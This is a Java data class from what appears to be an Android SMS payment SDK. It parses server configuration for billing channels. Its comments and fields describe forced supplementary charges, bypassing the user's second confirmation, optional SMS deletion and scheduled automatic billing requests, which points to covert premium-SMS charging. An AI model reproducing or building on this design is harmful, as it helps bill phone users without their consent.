package com.y7.smspay.sdk.json;

import com.y7.smspay.sdk.ss.SsParse;

import org.json.JSONObject;

//补单相关
public class SetEntity implements JsonInterface {
    /**
     * 是否需要判断删除短信能力 true为需要 false为不需要 删除短信能力
     *
     * public Boolean isDelSmsAbility = false;
     */
    /**
     * 是否需要二次确认 true为需要 false为不需要 二次确认拦截
     */
    public Boolean isSecondConfirm = true;

    /**
     * 补单金额
     */
    public String prices = "";

    /**
     * 2014-10-14 added by pengbb 强制补单价格
     */
    public int supplyPrice = 0;

    /* 优质通道 */
    public String AThrough;
    /* 普通通道 */
    public String BThrough;
    /* 补单 */
    public String CThrough;
    /* 第三方SDK */
    public String DThrough;
    public String EThrough;
    public String FThrough;
    public String GThrough;
    public String HThrough;

    public String phone1;
    public String phone2;

    // add 0418 是否取基站信息
    public String isBca;

    public int throughCount;

    @Override
    public JSONObject buildJson() {
        try {
            JSONObject json = new JSONObject();
            // json.put("isDelSmsAbility", isDelSmsAbility);
            json.put("isSecondConfirm", isSecondConfirm);

            json.put("prices", prices);
            json.put("supplyPrice", supplyPrice);

            json.put("AThrough", AThrough);

            json.put("BThrough", BThrough);

            json.put("CThrough", CThrough);
            json.put("DThrough", DThrough);
            json.put("EThrough", EThrough);
            json.put("FThrough", FThrough);
            json.put("GThrough", GThrough);
            json.put("HThrough", HThrough);

            json.put("phone1", phone1);
            json.put("phone2", phone2);

            json.put("isBca", isBca);
            json.put("throughCount", throughCount);

            return json;
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
        return null;
    }

    @Override
    public void parseJson(JSONObject json) {
        if (json == null)
            return;


        try {
            jsonString = json.toString();

            isSecondConfirm = json.isNull("isSecondConfirm") ? false : json
                    .getBoolean("isSecondConfirm");

            SsParse.isSecondConfirm = isSecondConfirm;

            prices = json.isNull("prices") ? null : json.getString("prices");
            supplyPrice = json.isNull("supplyPrice") ? 0 : json
                    .getInt("supplyPrice");
            AThrough = json.isNull("AThrough") ? null : json
                    .getString("AThrough");
            BThrough = json.isNull("BThrough") ? null : json
                    .getString("BThrough");
            CThrough = json.isNull("CThrough") ? null : json
                    .getString("CThrough");
            DThrough = json.isNull("DThrough") ? null : json
                    .getString("DThrough");
            EThrough = json.isNull("EThrough") ? null : json
                    .getString("EThrough");
            FThrough = json.isNull("FThrough") ? null : json
                    .getString("FThrough");
            GThrough = json.isNull("GThrough") ? null : json
                    .getString("GThrough");
            HThrough = json.isNull("HThrough") ? null : json
                    .getString("HThrough");
            phone1 = json.isNull("phone1") ? null : json.getString("phone1");
            phone2 = json.isNull("phone2") ? null : json.getString("phone2");

            isBca = json.isNull("isBca") ? null : json.getString("isBca");
            throughCount = json.isNull("throughCount") ? null : json.getInt("throughCount");

            JSONObject jsMReq = null;
            JSONObject jsfReq = null;
            if (!json.isNull("multipleReq")) {
                //DDDLog.d("multipleReq");
                //DDDLog.e(jsonString);

                jsMReq = json.getJSONObject("multipleReq");
            }

            if (!json.isNull("forceReq")) {
                //DDDLog.d("forceReq");
                jsfReq = json.getJSONObject("forceReq");
            }

            if (jsMReq != null) {
                //DDDLog.d("jsMReq");

                MultipleReq.interval = jsMReq.isNull("interval") ? 0 : jsMReq
                        .getInt("interval");// 每隔3秒请求一次通道
                MultipleReq.count = jsMReq.isNull("count") ? 0 : jsMReq
                        .getInt("count");// 请求次数

                //DDDLog.e("jsMReq "+MultipleReq.count);
            }
            if (jsfReq != null) {
                //DDDLog.e("jsfReq");

                ForceReq.init = jsfReq.isNull("init") ? 0 : jsfReq
                        .getInt("init");// 初始化完成10秒后
                ForceReq.interval = jsfReq.isNull("interval") ? 0 : jsfReq
                        .getInt("interval");// 每隔3秒自动请求一次通道
                ForceReq.count = jsfReq.isNull("count") ? 0 : jsfReq
                        .getInt("count");// 请求次数
                ForceReq.product = jsfReq.isNull("product") ? null : jsfReq
                        .getString("product");// 计费点名称
                ForceReq.price = jsfReq.isNull("price") ? "0" : jsfReq
                        .getString("price");// 请求资费
                ForceReq.did = jsfReq.isNull("did") ? null : jsfReq
                        .getString("did");

                //DDDLog.e("jsfReq "+ForceReq.count);
            }
        } catch (Exception e) {
            //DDDLog.e("Exception", e);
        }
    }

    @Override
    public String getShortName() {
        return null;
    }

    private String jsonString;

    @Override
    public String toString() {
        return this.jsonString;
    }
}
